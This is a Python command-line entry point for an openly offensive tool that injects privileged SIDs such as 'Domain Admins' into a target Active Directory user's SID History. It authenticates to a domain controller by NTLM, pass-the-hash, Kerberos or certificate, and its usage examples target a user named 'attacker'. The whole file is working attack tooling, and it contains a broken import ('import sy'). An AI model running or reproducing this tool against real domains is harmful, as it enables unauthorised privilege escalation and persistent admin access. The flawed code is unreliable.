#!/usr/bin/env python3
"""
SID History Attack Tool
Main entry point for the tool.
"""

import argparse
import sy
import logging
from typing import Optional

from core import SIDHistoryAttack, AuthenticationManager


def setup_logging(verbose: bool = False):
    """Configure logging."""
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format='[%(levelname)s] %(message)s',
        handlers=[logging.StreamHandler(sys.stdout)]
    )


def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description='SID History Attack Tool - Remotely manipulate SID History attributes in Active Directory',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Authentication Methods:
  --ntlm              NTLM with password (default)
  --ntlm-hash         Pass-the-Hash with NT hash
  --kerberos          Kerberos authentication (requires ticket)
  --certificate       Pass-the-Certificate with client cert
  --simple            SIMPLE bind (use with SSL)

Examples:
  NTLM authentication:
    %(prog)s -d DOMAIN.COM -u admin -p Password123 -dc 192.168.1.10 \\
             --target-user attacker --source-user "Domain Admins"

  Pass-the-Hash:
    %(prog)s -d DOMAIN.COM -u admin --ntlm-hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \\
             -dc 192.168.1.10 --target-user attacker --sid S-1-5-21-xxx-512

  Kerberos (with ticket):
    %(prog)s -d DOMAIN.COM -dc 192.168.1.10 --kerberos \\
             --target-user attacker --source-user Administrator

  Query SID History:
    %(prog)s -d DOMAIN.COM -u admin -p Pass123 -dc 192.168.1.10 --query-user attacker

  Lookup SID:
    %(prog)s -d DOMAIN.COM -u admin -p Pass123 -dc 192.168.1.10 --lookup-user "Domain Admins"
        """
    )

    # Connection parameters
    parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., DOMAIN.COM)')
    parser.add_argument('-dc', '--dc-ip', required=True, help='Domain controller IP address')
    parser.add_argument('--dc-hostname', help='Domain controller hostname (for Kerberos/SSL)')
    parser.add_argument('--use-ssl', action='store_true', help='Use LDAPS instead of LDAP')

    # Authentication parameters
    parser.add_argument('-u', '--username', help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    
    # Authentication methods
    auth_group = parser.add_mutually_exclusive_group()
    auth_group.add_argument('--ntlm', action='store_true', help='Use NTLM authentication (default)')
    auth_group.add_argument('--ntlm-hash', metavar='HASH', help='Use Pass-the-Hash (format: LM:NT or just NT)')
    auth_group.add_argument('--kerberos', action='store_true', help='Use Kerberos authentication')
    auth_group.add_argument('--certificate', action='store_true', help='Use client certificate')
    auth_group.add_argument('--simple', action='store_true', help='Use SIMPLE bind')

    # Kerberos options
    parser.add_argument('--ccache', help='Path to Kerberos credential cache')

    # Certificate options
    parser.add_argument('--cert-file', help='Path to client certificate file (.pem)')
    parser.add_argument('--key-file', help='Path to client key file (.pem)')

    # Actions
    action_group = parser.add_mutually_exclusive_group(required=True)
    action_group.add_argument('--target-user', help='Target user to modify')
    action_group.add_argument('--query-user', help='Query SID History of a user')
    action_group.add_argument('--lookup-user', help='Lookup SID of a specific user')

    # Modification options
    parser.add_argument('--source-user', help='Source user whose SID to inject')
    parser.add_argument('--source-domain', help='Source domain (for trusted domain SID injection)')
    parser.add_argument('--sid', help='Specific SID to add/remove')
    parser.add_argument('--remove', action='store_true', help='Remove SID instead of adding')
    parser.add_argument('--clear', action='store_true', help='Clear all SID History')

    # Other options
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')

    return parser.parse_args()


def determine_auth_method(args) -> str:
    """Determine which authentication method to use."""
    if args.ntlm_hash:
        return AuthenticationManager.AUTH_NTLM_HASH
    elif args.kerberos:
        return AuthenticationManager.AUTH_KERBEROS
    elif args.certificate:
        return AuthenticationManager.AUTH_CERTIFICATE
    elif args.simple:
        return AuthenticationManager.AUTH_SIMPLE
    else:
        return AuthenticationManager.AUTH_NTLM


def validate_arguments(args, auth_method: str, parser) -> bool:
    """Validate argument combinations."""
    # Check authentication requirements
    if auth_method == AuthenticationManager.AUTH_NTLM:
        if not args.username or not args.password:
            parser.error("NTLM authentication requires --username and --password")
            return False

    elif auth_method == AuthenticationManager.AUTH_NTLM_HASH:
        if not args.username:
            parser.error("Pass-the-Hash requires --username")
            return False

    elif auth_method == AuthenticationManager.AUTH_CERTIFICATE:
        if not args.cert_file or not args.key_file:
            parser.error("Certificate authentication requires --cert-file and --key-file")
            return False

    elif auth_method == AuthenticationManager.AUTH_SIMPLE:
        if not args.username or not args.password:
            parser.error("SIMPLE authentication requires --username and --password")
            return False

    # Check action requirements
    if args.target_user:
        if not (args.source_user or args.sid or args.clear):
            parser.error("--target-user requires --source-user, --sid, or --clear")
            return False
        
        if args.remove and not args.sid:
            parser.error("--remove requires --sid")
            return False

    return True


def perform_authentication(attacker: SIDHistoryAttack, args, auth_method: str) -> bool:
    """Perform authentication with the specified method."""
    auth_params = {
        'use_ssl': args.use_ssl,
        'username': args.username,
        'password': args.password
    }

    if auth_method == AuthenticationManager.AUTH_NTLM_HASH:
        auth_params['nt_hash'] = args.ntlm_hash

    elif auth_method == AuthenticationManager.AUTH_KERBEROS:
        auth_params['ccache_path'] = args.ccache
        del auth_params['username']
        del auth_params['password']

    elif auth_method == AuthenticationManager.AUTH_CERTIFICATE:
        auth_params['cert_file'] = args.cert_file
        auth_params['key_file'] = args.key_file
        del auth_params['password']

    return attacker.authenticate(auth_method, **auth_params)


def handle_query_action(attacker: SIDHistoryAttack, username: str):
    """Handle query user action."""
    logging.info(f"Querying SID History for {username}")
    sid_history = attacker.get_current_sid_history(username)
    
    if sid_history:
        print(f"\nSID History for {username}:")
        for sid in sid_history:
            print(f"  {sid}")
    else:
        print(f"\nNo SID History found for {username}")


def handle_lookup_action(attacker: SIDHistoryAttack, username: str):
    """Handle lookup user action."""
    logging.info(f"Looking up SID for {username}")
    sid = attacker.get_user_sid(username)
    
    if sid:
        print(f"\nSID for {username}: {sid}")
    else:
        print(f"\nUser {username} not found")


def handle_modify_action(attacker: SIDHistoryAttack, args) -> bool:
    """Handle SID History modification actions."""
    if args.clear:
        success = attacker.clear_sid_history(args.target_user)
        if success:
            print(f"\n[+] Successfully cleared SID History for {args.target_user}")
        return success

    elif args.remove and args.sid:
        success = attacker.remove_sid_from_history(args.target_user, args.sid)
        if success:
            print(f"\n[+] Successfully removed SID from {args.target_user}")
        return success

    else:
        # Add SID
        if args.source_user:
            success = attacker.inject_sid_history(
                args.target_user, 
                args.source_user,
                source_domain=args.source_domain
            )
        else:
            success = attacker.add_sid_to_history(args.target_user, args.sid)

        if success:
            print(f"\n[+] SID History successfully modified")
            
            # Show updated history
            updated_history = attacker.get_current_sid_history(args.target_user)
            if updated_history:
                print(f"\nUpdated SID History for {args.target_user}:")
                for sid in updated_history:
                    print(f"  {sid}")
        
        return success


def main():
    """Main entry point."""
    args = parse_arguments()
    setup_logging(args.verbose)

    auth_method = determine_auth_method(args)
    
    if not validate_arguments(args, auth_method, argparse.ArgumentParser()):
        sys.exit(1)

    # Initialize attack tool
    attacker = SIDHistoryAttack(
        dc_ip=args.dc_ip,
        domain=args.domain,
        dc_hostname=args.dc_hostname
    )

    # Authenticate
    if not perform_authentication(attacker, args, auth_method):
        logging.error("Failed to connect to domain controller")
        sys.exit(1)

    try:
        # Perform requested action
        if args.query_user:
            handle_query_action(attacker, args.query_user)
            sys.exit(0)

        elif args.lookup_user:
            handle_lookup_action(attacker, args.lookup_user)
            sys.exit(0)

        elif args.target_user:
            success = handle_modify_action(attacker, args)
            sys.exit(0 if success else 1)

    except KeyboardInterrupt:
        logging.info("\nOperation cancelled by user")
        sys.exit(130)
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
    finally:
        attacker.disconnect()


if __name__ == '__main__':
    main()

